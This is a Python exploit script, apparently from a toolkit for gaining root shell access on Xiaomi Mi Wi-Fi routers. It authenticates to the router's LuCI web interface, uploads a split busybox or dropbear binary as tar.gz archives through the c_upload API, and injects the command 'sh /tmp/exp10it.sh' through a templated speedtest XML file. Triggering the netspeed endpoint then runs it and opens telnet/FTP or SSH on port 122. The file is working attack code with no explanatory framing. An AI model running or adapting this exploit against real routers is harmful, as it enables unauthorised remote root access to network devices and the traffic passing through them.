#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import hashlib
import requests
import socket
import tarfile

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import gateway
from gateway import die


gw = gateway.Gateway(detect_device = False)
if len(sys.argv) < 2:
  ip_addr = gw.ip_addr
else:
  ip_addr = sys.argv[1]
  if not ip_addr:
    die("You entered an empty IP-address!")
  gw.ip_addr(ip_addr)
  gw.save_config()

def get_http_headers():
  headers = {}
  headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
  headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
  return headers

gw = gateway.Gateway(timeout = 4)
if gw.status < 1:
  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(ip_addr))

dname = gw.device_name
print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))

if gw.ping(verbose = 0) is True:
  die(0, "Exploit already installed and running")

try: 
  r0 = requests.get("http://{ip_addr}/cgi-bin/luci/web".format(ip_addr = ip_addr), timeout = 4)
except Exception:
  die("Xiaomi Mi Wi-Fi device not found! (ip: {})".format(ip_addr))

try:
  mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
except Exception:
  die("Xiaomi Mi Wi-Fi device is wrong model or not the stock firmware in it.")

key = re.findall(r'key: \'(.*)\',', r0.text)[0]
nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
password = input("Enter device WEB password: ")
account_str = (password + key).encode('utf-8')
account_str = hashlib.sha1(account_str).hexdigest()
password = (nonce + account_str).encode('utf-8')
password = hashlib.sha1(password).hexdigest()
username = 'admin'
data = "username={username}&password={password}&logtype=2&nonce={nonce}".format(username = username, password = password, nonce = nonce)
requrl = "http://{ip_addr}/cgi-bin/luci/api/xqsystem/login".format(ip_addr = ip_addr)
r1 = requests.post(requrl, data = data, headers = get_http_headers())
try:
  stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
except Exception:
  die("Password is not correct!")

dn_tmp = 'tmp/'
if gw.use_ssh:
  dn_dir = 'data/payload_ssh/'
else:
  dn_dir = 'data/payload/'

print("Begin creating a payload for the exploit...")
fn_payload1 = 'tmp/payload1.tar.gz'
fn_payload2 = 'tmp/payload2.tar.gz'
fn_payload3 = 'tmp/payload3.tar.gz'
if gw.use_ssh:
  fn_pfname = 'dropbearmulti'
else:
  fn_pfname = 'busybox'

fn_pf1 = dn_tmp + fn_pfname + '_01'
fn_pf2 = dn_tmp + fn_pfname + '_02'
fn_pf3 = dn_tmp + fn_pfname + '_03'

fn_suffix = '_mips'
if dname == 'r3d':
  fn_suffix = '_armv7a'
if dname == "rb03":
  fn_suffix = '_arm64'

fn_pf = dn_dir + fn_pfname + fn_suffix

if os.path.exists(fn_payload1):
  os.remove(fn_payload1)
if os.path.exists(fn_payload2):
  os.remove(fn_payload2)
if os.path.exists(fn_payload3):
  os.remove(fn_payload3)

with open(fn_pf, "rb") as file:
  pf = file.read()
psize = len(pf) // 3
wsize = psize + 8000
with open(fn_pf1, "wb") as file:
  file.write(pf[:wsize])
pf = pf[wsize:]
wsize = psize - 8000
with open(fn_pf2, "wb") as file:
  file.write(pf[:wsize])
pf = pf[wsize:]
with open(fn_pf3, "wb") as file:
  file.write(pf)

fn_exploit = "exp10it.sh"
command = "sh /tmp/" + fn_exploit

fn_executor = "speedtest_urls.xml"
with open(dn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
  template = file.read()
data = template.format(router_ip_address=ip_addr, command=command)
with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
  file.write(data)

with tarfile.open(fn_payload1, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf1, arcname = os.path.basename(fn_pf1))

with tarfile.open(fn_payload2, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf2, arcname = os.path.basename(fn_pf2))

with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
  tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
  tar.add(dn_tmp + fn_executor, arcname = fn_executor)

if os.path.exists(fn_pf1):
  os.remove(fn_pf1)
if os.path.exists(fn_pf2):
  os.remove(fn_pf2)
if os.path.exists(fn_pf3):
  os.remove(fn_pf3)

tgz_size1 = os.path.getsize(fn_payload1)
if tgz_size1 > 100*1024 - 128:
  die("File size {} exceeds 100KiB".format(fn_payload1)) 

tgz_size2 = os.path.getsize(fn_payload2)
if tgz_size2 > 100*1024 - 128:
  die("File size {} exceeds 100KiB".format(fn_payload2)) 

print("Start uploading the exploit with payload...")
urlapi = "http://{ip_addr}/cgi-bin/luci/;stok={stok}/api/".format(ip_addr = ip_addr, stok = stok)

if (fn_payload1):
  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
if (fn_payload2):
  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
if (fn_payload3):
  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})

time.sleep(1)

if gw.use_ssh:
  print("Running SSH server on port 122...")
else:
  print("Running TELNET and FTP servers...")

requests.get(urlapi + "xqnetdetect/netspeed")

time.sleep(0.5)
gw.ping()

print("")
print("#### Connection to device {} is OK ####".format(gw.device_name))
